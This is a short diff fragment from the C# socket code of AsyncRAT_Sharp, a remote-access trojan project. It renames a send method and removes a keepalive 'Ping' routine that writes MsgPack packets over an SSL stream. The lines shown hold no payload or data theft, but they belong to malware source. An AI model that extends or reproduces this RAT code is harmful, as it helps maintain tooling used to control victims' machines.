@@ -140,7 +140,7 @@ namespace AsyncRAT_Sharp.Sockets
             catch { }
         }
 
-        public void BeginSend(object msg)
+        public void Send(object msg)
         {
             lock (SendSync)
             {
@@ -170,31 +170,6 @@ namespace AsyncRAT_Sharp.Sockets
                     return;
                 }
 
-            }
-        }
-
-        public void Ping(object obj)
-        {
-            lock (SendSync)
-            {
-
-                try
-                {
-                    MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "Ping";
-                    msgpack.ForcePathObject("Message").AsString = "This is a ping!";
-                    byte[] buffer = msgpack.Encode2Bytes();
-                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);
-                    ClientSocket.Poll(-1, SelectMode.SelectWrite);
-                    ClientSslStream.Write(buffersize, 0, buffersize.Length);
-                    ClientSslStream.Write(buffer, 0, buffer.Length);
-                    ClientSslStream.Flush();
-                }
-                catch
-                {
-                    Disconnected();
-                    return;
-                }
             }
         }
 
